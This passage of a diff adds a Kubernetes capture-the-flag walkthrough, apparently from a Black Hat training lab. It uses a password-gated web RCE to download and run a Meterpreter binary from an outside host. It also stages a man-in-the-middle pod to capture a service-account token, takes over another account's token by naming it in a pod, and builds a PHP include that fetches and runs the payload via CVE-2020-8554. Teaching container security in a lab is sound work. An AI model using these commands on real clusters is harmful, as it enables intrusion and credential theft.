+</li>
+<li>
+<p>Observe that the password was &quot;god&quot; - here's the output from our test system:</p>
+<pre><code>cmd parameter must be Base64-encoded.
+</code></pre></li>
+<li>
+<p>This is similar to how we got into the cluster. We just need to Base64-encode our <code>cmd</code> value. Let's try this:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">value</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="s2">"id"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="si">)</span>
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?cmd<span class="o">=</span><span class="nv">$value</span><span class="se">\&amp;</span><span class="nv">password</span><span class="o">=</span>god
+</code></pre></div></div>
+</li>
+<li>
+<p>Now use this as a shell to get a new Meterpreter.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">cmd</span><span class="o">=</span><span class="s2">"curl -o /tmp/mrsbin http://10.23.58.30:9000/mrsbin"</span>
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?password<span class="o">=</span>god<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$cmd</span> | <span class="nb">base64</span><span class="si">)</span>
+<span class="nv">cmd</span><span class="o">=</span><span class="s2">"chmod 755 /tmp/mrsbin"</span>
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?password<span class="o">=</span>god<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$cmd</span> | <span class="nb">base64</span><span class="si">)</span>
+<span class="nv">cmd</span><span class="o">=</span><span class="s2">"/tmp/mrsbin"</span>
+curl <span class="nt">-sk</span>  <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/?password<span class="o">=</span>god<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$cmd</span> | <span class="nb">base64</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's switch to the new session.  First, hit Ctrl-Z to background this Meterpreter channel.</p>
+<pre><code>Hit Ctrl-z
+</code></pre></li>
+<li>
+<p>Next, hit y to confirm.</p>
+<pre><code>Hit y
+</code></pre></li>
+<li>
+<p>Now, tell the Metasploit console that you'd like to background the session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>background
+</code></pre></div></div>
+</li>
+<li>
+<p>Get a list of sesssions:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-l</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Switch to the new session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 2
+</code></pre></div></div>
+</li>
+<li>
+<p>Start a shell:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Run <code>bash -i</code> to make it more friendly.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now we are in a pod called &quot;whats-the-password-rce&quot;.  List the current directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Read the hint.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>HINT.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>The hint says this:</p>
+<pre><code>Go get your flag: flag-phreaks-payphone-trick.
+
+From here, there are multiple serial challenges that won't 
+give you a new pod yet.
+
+Flag challenge 1:
+
+Razor reaches Blade by way of a service.  Can you intercept
+the messages? There's a flag and a service account token in 
+these.
+
+Note: the service account token isn't Razor's or Blade's token.
+
+
+Flag challenge 2:
+
+Once you have that next service account token, you need to 
+steal the davinci service account's token in the 
+ellingson-min namespace.
+
+This will allow you to claim the flag-davinci secret in that
+namespace.
+
+Flag challenge 3:
+
+Connect to the ellingson-min namespace's gibson pod and get 
+remote execution inside that pod.
+</code></pre></li>
+<li>
+<p>Set up a new alias for this pod in this namespace.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/token<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n </span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/namespace<span class="si">)</span><span class="s2">"</span> 
+</code></pre></div></div>
+</li>
+<li>
+<p>Try listing services, but find you aren't permitted to get that list.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get services
+</code></pre></div></div>
+</li>
+<li>
+<p>Ask what your service account token is allow to do with <code>kubectl auth can-i --list</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>We can read a secret called <code>flag-phreaks-payphone-trick</code> and we can create pods.  Get the flag first.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret flag-phreaks-payphone-trick <span class="nt">-o</span> yaml | <span class="se">\</span>
+  egrep <span class="nt">-v</span> <span class="s1">'^data:'</span> | <span class="nb">grep </span>flag | <span class="se">\</span>
+  <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">head</span> <span class="nt">-1</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>You get a flag similar to or the same as this:</p>
+<p><code>phreaks-payphone-trick-FLAG-b74f826e-0e10-453a-9d07-58e1796f968e</code></p>
+</li>
+<li>
+<p>We can create a pod to MitM blade and razor, but we'll need to read the services to do this. If you didn't take notes, go back to the cereal pod and read the services.  Otherwise, just use the blade service.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://blade.phreaks-nynex-kingdom
+</code></pre></div></div>
+</li>
+<li>
+<p>This shows us a form - it looks like the form is going to take submissions that look like this:</p>
+<pre><code>http://blade.phreaks-nynex-kingdom/index.php?flag=s&amp;token=s&amp;submit=submit
+</code></pre></li>
+<li>
+<p>We saw from the service file that it redirects traffic for this URL to any pods in the <code>phreaks-nynex-kingdom</code> namespace, so long as their <code>app</code> label is set to <code>blade</code>.  We can receive some of the traffic that's going to <code>blade</code> pods if we can stage our own pod in this namespace and set its <code>app</code> label to <code>blade</code>. For this pod, we'll want to use an image that lets us see the valid requests coming from the <code>razor</code> pod.</p>
+</li>
+<li>
+<p>Think about what image we should use for this pod. We could use an image that would be vulnerable to remote code execution, but we don't really need to run commands in this new pod. We just need to see the incoming HTTP requests.  Since the requests are GET requests, their parameters will be logged in the webserver logs. That's the key. We have an image that runs a webserver which serves up its own log files. Here's its Dockerfile, if you're curious. It's publicly-available on Docker Hub, but it's also cached on the Bustakube cluster's registry.</p>
+<pre><code># dockerhub: bustakube/webserver-sharemylogs:latest
+FROM nginx:latest
+RUN sed -i 's/server {/server {  disable_symlinks off;/' /etc/nginx/conf.d/default.conf
+RUN sed -i 's/location \/ {/location \/ {   autoindex on;/' /etc/nginx/conf.d/default.conf
+RUN ln -s /var/log/nginx /usr/share/nginx/html/log
+RUN rm /var/log/nginx/access.log /var/log/nginx/error.log
+COPY index.html /usr/share/nginx/html/
+RUN chown -R nginx /usr/share/nginx /var/log/nginx /var/cache/nginx /var/run
+RUN chmod 777 /var/run
+RUN sed -i 's/listen       80;/listen   8000;/' /etc/nginx/conf.d/default.conf
+RUN cat /etc/nginx/conf.d/default.conf
+USER nginx
+EXPOSE 8000
+</code></pre></li>
+<li>
+<p>Let's create a template for a pod that has its <code>app</code> label set to <code>blade</code>. It will use the <code>bustakube:webserver-sharemylogs</code> image.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-o</span> yaml <span class="nt">--dry-run</span><span class="o">=</span>client run mitm <span class="se">\</span>
+  <span class="nt">--image</span><span class="o">=</span><span class="s2">"bustakube/webserver-sharemylogs"</span> <span class="se">\</span>
+  <span class="nt">--labels</span> <span class="s2">"app=blade"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's create this pod it for real. Pretend this got blocked. (Note: it's not going to get blocked, but it should be...):</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#kubectl run mitm \</span>
+<span class="c">#  --image="bustakube/webserver-sharemylogs" \</span>
+<span class="c">#  --labels "app=blade"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Unfortunately, we (are supposed to) have a Pod Security Policy that's blocking us. At Black Hat 2023 this year, this PSP is missing or otherwise not working. When we did the exercise, here's the output we got on our test system:</p>
+<pre><code>Error from server (Forbidden): pods &quot;mitm&quot; is forbidden: PodSecurityPolicy: no providers available to validate pod request
+</code></pre></li>
+<li>
+<p>Let's upload a template file that sets a security context. Read the file over - you'll see that we make our pod say containers will run as a non-root user and group (UID and GID 101), that we set &quot;allowPrivilegeEscalation: false,&quot; which deactivates Set-UID binaries, and tell the system to use the default apparmor and seccomp profiles.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;pod-mitm.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: mitm
+  namespace: phreaks-nynex-kingdom
+  labels:
+    app: blade
+  annotations:
+    container.apparmor.security.beta.kubernetes.io/mitm: runtime/default
+    seccomp.security.alpha.kubernetes.io/pod: runtime/default
+spec:
+  securityContext:
+    runAsUser: 101
+    runAsGroup: 101
+    fsGroup: 101
+  containers:
+  - name: mitm
+    image: docker-registry:5000/bustakube/webserver-sharemylogs
+    securityContext:
+      allowPrivilegeEscalation: false
+  imagePullSecrets:
+  - name: regcred-docker-registry-5000
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Now apply it:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> pod-mitm.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's get code execution inside the pod we launched. We don't have permissions to exec into pods, but, since we chose the image that runs there, we chose an image we built with an intentional vulnerability.</p>
+</li>
+<li>
+<p>Get the pod's IP address:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pod mitm <span class="nt">-o</span> wide
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's parse the IP out of that listing and put it in a variable called <code>podip</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">podip</span><span class="o">=</span><span class="si">$(</span>kubectl get pod mitm <span class="nt">-o</span> wide | <span class="nb">grep </span>mitm | <span class="nb">awk</span> <span class="s1">'{print $6}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's request the access.log from this pod's web server:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://<span class="k">${</span><span class="nv">podip</span><span class="k">}</span>:8000/log/access.log
+</code></pre></div></div>
+</li>
+<li>
+<p>We can get a flag out of this output! Let's grab the lines that have <code>flag=</code> in them:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://<span class="k">${</span><span class="nv">podip</span><span class="k">}</span>:8000/log/access.log | <span class="nb">grep</span> <span class="s1">'flag='</span> <span class="o">&gt;</span>log
+</code></pre></div></div>
+</li>
+<li>
+<p>Now get just one line from that file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head</span> <span class="nt">-1</span> log <span class="o">&gt;</span>oneline
+</code></pre></div></div>
+</li>
+<li>
+<p>Grab the flag itself from that line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>oneline | <span class="nb">awk</span> <span class="nt">-Fflag</span><span class="o">=</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="se">\&amp;</span> <span class="s1">'{print $1}'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Grab the service account token out of that line.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>oneline | <span class="nb">awk</span> <span class="nt">-Fserviceaccounttoken</span><span class="o">=</span> <span class="s1">'{print $2}'</span> | <span class="se">\</span>
+  <span class="nb">awk</span> <span class="s1">'{print $1}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="p">;</span> <span class="nb">echo</span> <span class="s2">""</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>That token will look like this:</p>
+<pre><code>eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwUnZfbTZQV2tEQlFQaGt1b2Q1S21QZ3ByT21wamZ2QVpORC1jZWVFZzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlbGxpbmdzb24tbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InRoZXBsYWd1ZS10b2tlbi1iOW1wbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJ0aGVwbGFndWUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI3ZDk0NmJiMC1iMmVhLTRiOTMtODY1ZS0yMmVlZGY3NzM4ZDYiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZWxsaW5nc29uLW1pbjp0aGVwbGFndWUifQ.c7-eNe66P4U_W1wfb4KgOdLU-oMPvm_goxNKiccLyfNvxKw92vjc5riFlJZ6UiuG0dsQRywz5WoEWnI-aq5jK8ygbSdCmQ03KHEZ4H0hP3lMYnOjDyb0Jjzd1i0a9UPaxJUQRSw0mrdJ3ItjR43Jx8zo_SiNwdAa-fqYOtQMvzEXxERyz-UFl4ZJxcCoc4n2FQdK6AUoG8ZDua8v9B0rUkmuGvFPRQbVwrCL3M_WY9ebOMFipr88ZsjwztRVEOrNpe1T97LL8W3oX0YuZbX_eNnkYGwrMFcXpgl-68Q9Ame8ssISkvVLiT8RheUaplmOzPzuCbcE2rft863CI08KtA
+</code></pre></li>
+<li>
+<p>Write that token to a file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>oneline | <span class="nb">awk</span> <span class="nt">-Fserviceaccounttoken</span><span class="o">=</span> <span class="s1">'{print $2}'</span> | <span class="se">\</span>
+  <span class="nb">awk</span> <span class="s1">'{print $1}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span>/newtoken
+</code></pre></div></div>
+</li>
+<li>
+<p>Make a new alias for kubectl using this new token</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span> <span class="nb">cat</span> /newtoken <span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n </span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$tokendir</span>/namespace<span class="si">)</span><span class="s2">"</span> 
+</code></pre></div></div>
+</li>
+<li>
+<p>Now try using it to list pods</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe that you're not permitted to list pods in this namespace using that token. The error message is helpful, though. It says that the token is authenticating you as <code>theplague</code> from the <code>ellingson-min</code> namespace. Here's the output from our test system:</p>
+<pre><code>Error from server (Forbidden): pods is forbidden: User &quot;system:serviceaccount:ellingson-min:theplague&quot; cannot list resource &quot;pods&quot; in API group &quot;&quot; in the namespace &quot;phreaks-nynex-kingdom&quot;
+</code></pre></li>
+<li>
+<p>Alter our kubectl alias to use the ellingson-min namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span> <span class="nb">cat</span> /newtoken <span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server=https://kubernetes.default.svc.cluster.local </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n ellingson-min"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Test this:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ellingson-min get pods
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we have a Gibson pod, corresponding to the big mainframe in the movie:</p>
+<pre><code>NAME     READY   STATUS    RESTARTS   AGE
+gibson   1/1     Running   0          8h
+</code></pre></li>
+<li>
+<p>Our HINT's next step was:</p>
+<pre><code>Once you have that next service account token, you need to 
+steal the davinci service account's token in the 
+ellingson-min namespace.
+
+This will allow you to claim the flag-davinci secret in that
+namespace.
+</code></pre></li>
+<li>
+<p>This is the next puzzle in the CTF. How can you steal the <code>davinci</code> service account token in the <code>ellingson-min</code> namespace?</p>
+</li>
+<li>
+<p>Find out what your new service account token is allowed to do in the <code>ellingson-min</code> namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ellingson-min auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we're allowed to create, list and read pods and that we're also allowed to list and read services. Here's an excerpt of the output of the last command on our test system:</p>
+<pre><code>pods                                            []                                    []               [create get list]
+...
+services                                        []                                    []               [list get]
+</code></pre></li>
+<li>
+<p>Here's the insight. If we can deploy a pod in this namespace, we can name any service account we'd like in the pod manifest. The pod will get that service account and will get a token as that account. There isn't anything in &quot;stock&quot; Kubernetes that would prevent that.</p>
+</li>
+<li>
+<p>Let's deploy a new pod in the <code>ellingson-min</code> namespace, called <code>getsa</code>, naming <code>davinci</code> as the <code>serviceAccountName</code> value. We'll use an image called &quot;sharemysatoken&quot; which we've made that shares its web server logs, but also shares its serviceaccount token file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">ENDL</span><span class="sh"> &gt;pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: getsa
+  namespace: ellingson-min
+  annotations:
+    container.apparmor.security.beta.kubernetes.io/getsa: runtime/default
+    seccomp.security.alpha.kubernetes.io/pod: runtime/default
+spec:
+  serviceAccountName: davinci
+  securityContext:
+    runAsUser: 101
+    runAsGroup: 100
+    fsGroup: 100
+  containers:
+  - name: getsa
+    image: docker-registry:5000/bustakube/sharemysatoken
+    securityContext:
+      allowPrivilegeEscalation: false
+  imagePullSecrets:
+  - name: regcred-docker-registry-5000
+</span><span class="no">ENDL
+
+</span>kubectl apply <span class="nt">-f</span> pod.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now we want to request the token from that pod. Get its IP address:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">podip</span><span class="o">=</span><span class="si">$(</span>kubectl get pod getsa <span class="nt">-o</span> wide | <span class="nb">grep </span>getsa | <span class="nb">awk</span> <span class="s1">'{print $6}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Request the token:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://<span class="k">${</span><span class="nv">podip</span><span class="k">}</span>:8000/token
+</code></pre></div></div>
+</li>
+<li>
+<p>Put the token in a file called &quot;davincitoken&quot;:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://<span class="k">${</span><span class="nv">podip</span><span class="k">}</span>:8000/token <span class="o">&gt;</span>/davincitoken
+</code></pre></div></div>
+</li>
+<li>
+<p>Tweak your kubectl alias to use this token:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> /davincitoken<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n ellingson-min"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Ask what this token is allowed to do in the ellingson-min namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we're allowed to create, read and list services, read the <code>flag-davinci</code> secret, and read and list pods.</p>
+<pre><code>services                                        []                                    []               [create get list]
+secrets                                         []                                    [flag-davinci]   [get]
+pods                                            []                                    []               [list get]
+</code></pre></li>
+<li>
+<p>Grab the flag from the <code>flag-davinci</code> secret:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secret flag-davinci <span class="nt">-o</span> yaml | egrep <span class="nt">-A</span> 1 <span class="s1">'data:'</span> | <span class="se">\</span>
+  <span class="nb">grep </span>flag | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Think about the last challenge:</p>
+<pre><code>Flag challenge 3:
+
+Connect to the ellingson-min namespace's gibson pod and get 
+remote execution inside that pod.
+</code></pre></li>
+<li>
+<p>To recap what privileges we have in this namespace: we have the <code>davinci</code> service account token (in <code>/davincitoken</code>), which is allowed to create services and configMaps and we have the <code>theplague</code> token (in <code>/newtoken</code>) which is allowed to create pods.</p>
+</li>
+<li>
+<p>Let's set up a kubectl aliases for each token, to make things easier. First, <code>unalias</code> the <code>kubectl</code> command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unalias </span>kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, set up a <code>kubectl-theplague</code> alias for when we need to use <code>theplague</code>'s token.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">tokendir</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span>kubectl-theplague<span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> /newtoken<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt -n ellingson-min"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, set up a <code>kubectl-davinci</code> alias for when we need to use <code>davinci</code>'s token.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias </span>kubectl-davinci<span class="o">=</span><span class="s2">"kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> /davincitoken<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--server="</span>https://kubernetes.default.svc.cluster.local<span class="s2">" </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$tokendir</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+-n ellingson-min"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>So let's check out the <code>gibson</code> pod.  First, get its IP address:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span><span class="si">$(</span>kubectl-davinci get pods <span class="nt">-o</span> wide |grep gibson | <span class="nb">awk</span> <span class="s1">'{print $6}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Connect to the IP:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Review the output from that page. The output from our test system follows:</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&quot;Row, row, row!&quot;
+&lt;p&gt;
+Unless five million dollars are transferred to the following numbered account in seven days, I will capsize five tankers in the Ellingson fleet.
+&lt;p&gt;
+This PHP page's next line of code is this:
+&lt;p&gt;
+&lt;pre&gt;
+include 'http://static.containersecurityctf.com/static-inclusion.php';
+&lt;/pre&gt;
+&lt;p&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></li>
+<li>
+<p>What this means is that if we can intercept (MitM) gibson pod's request to http://static.containersecurityctf.com/static-inclusion.php, then we'd be able to run PHP in that pod. There's a vulnerability in Kubernetes that you can read about here:</p>
+<p><a href="https://github.com/kubernetes/kubernetes/issues/97076">CVE-2020-8554</a></p>
+</li>
+<li>
+<p>Stop and think about the steps we'll need to take to exploit this:</p>
+<ol>
+<li>Create a <code>static-inclusion.php</code> file that the gibson can pull down and run, granting RCE.</li>
+<li>Stage a pod running a web server that serves this file.</li>
+<li>Create an ExternalIP service that redirects outbound traffic that's going to the real <code>static.containersecurityctf.com</code> to the pod we just staged.</li>
+<li>Make a request against the gibson, triggering it to pull down <code>static-inclusion.php</code>.</li>
+</ol>
+</li>
+<li>
+<p>OK, so step 1 - let's create that <code>static-inclusion.php</code> file. We want the file to be a valid PHP page, so let's start by putting the <code>&lt;?php</code> header at the top.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'&lt;?php'</span> <span class="o">&gt;</span>si.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, let's add a line that defines our URL as a variable called <code>$url</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$url = "http://10.23.58.30:9000/mrsbin"; '</span> <span class="o">&gt;&gt;</span>si.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, have the PHP run a command to request the <code>mrsbin</code> binary from our webserver and place it in <code>/tmp/</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$cmd = shell_exec( "curl -o /tmp/mrsbin $url"); '</span> <span class="o">&gt;&gt;</span>si.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, have the PHP run a command to make <code>/tmp/mrsbin</code> executable and run it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$cmd = shell_exec( "chmod 755 /tmp/mrsbin ; /tmp/mrsbin"); '</span> <span class="o">&gt;&gt;</span>si.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, close out the PHP file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'?&gt;'</span> <span class="o">&gt;&gt;</span>si.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Rename the file to <code>static-inclusion.php</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>si.php static-inclusion.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Now it's time for step 2 - we need to create a pod to serve the <code>static-inclusion.php</code> file. We have container image that we can use - it's a simple Apache webserver that listens on port 8000. A very Kubernetes-style way of putting the content (<code>static-inclusion.php</code>) in the webserver is to put that content in some sort of volume that the pod can mount. That keeps the frequently-changing content out of the container image.</p>
+<p>While there are quite a few volume types out there, we're going to use an unusual one for this exercise. Our <code>davinci</code> service account is allowed to create configMaps. We'll make a configMap from the <code>static-inclusion.php</code> file we just created and then insert that configMap in as the contents of the web server's <code>html</code> directory.</p>
+<p>Use kubectl to create a configMap called <code>staticinclusionfile</code> in the <code>ellingson-min</code> namespace:</p>
